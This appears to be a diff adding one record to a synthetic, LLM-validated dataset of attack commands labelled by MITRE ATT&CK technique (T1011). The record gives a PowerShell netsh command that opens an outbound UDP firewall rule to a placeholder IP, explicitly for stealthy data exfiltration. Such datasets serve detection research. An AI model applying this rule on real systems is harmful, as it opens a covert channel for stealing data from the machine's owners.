@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
+  "explanation": "Creates a targeted outbound UDP allow rule for a high, uncommon port used by the configured tunnel/proxy, enabling alternate-medium exfiltration with minimal exposure (T1011).",
+  "rationale_steps": [
+    "Allow only the UDP port used by the tunnel (e.g., Teredo or custom proxy).",
+    "Restrict the rule to a single remote IP to avoid broad network impact.",
+    "Enable stealthy data egress over non-standard UDP channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-046c34a1",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed netsh advfirewall add rule command with valid parameters, balanced quoting, and correct flag usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It adds a targeted outbound UDP allow rule to a specific remote IP/port that facilitates alternate-medium exfiltration, but requires administrative privileges and does not itself perform exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T21:02:47.861587Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
